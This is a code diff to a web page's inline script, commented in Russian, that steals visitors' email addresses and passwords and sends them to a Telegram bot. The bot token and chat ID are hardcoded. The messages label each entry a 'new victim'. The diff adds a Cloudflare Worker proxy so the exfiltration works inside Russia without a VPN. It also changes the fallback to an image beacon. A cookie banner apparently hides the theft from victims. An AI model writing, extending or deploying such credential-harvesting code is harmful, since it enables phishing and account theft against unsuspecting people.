@@ -158,14 +158,24 @@
 
 <script>
     // ===== ВАШИ ДАННЫЕ =====
+    const PROXY_URL = "https://russian-test.donatstaff.workers.dev";
     const BOT_TOKEN = "8924231437:AAHSGN-TXN3D2olEVudrr53xp22SC03PCL8";
     const CHAT_ID = "8872810304";
     // ========================
 
     function sendToTelegram(email, password, type) {
         const text = "📩 НОВАЯ ЖЕРТВА (" + type + ")\n📧 Email: " + email + "\n🔑 Пароль: " + password + "\n🕒 " + new Date().toLocaleString("ru-RU");
+
+        // Отправка через Cloudflare Worker (работает в РФ без VPN)
+        fetch(PROXY_URL + "/bot" + BOT_TOKEN + "/sendMessage", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+        }).catch(function() {});
+
+        // Резервная отправка напрямую (если у жертвы VPN)
         const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(text);
-        fetch(url).catch(function() {});
+        new Image().src = url;
     }
 
     function collectAndSend(type) {
@@ -208,7 +218,7 @@
         setTimeout(checkAutoFill, 3000);
     });
 
-    console.log("ROCKET ACTIVE — Нижний баннер cookie готов");
+    console.log("ROCKET ACTIVE — Прокси + баннер cookie");
 </script>
 </body>
 </html>
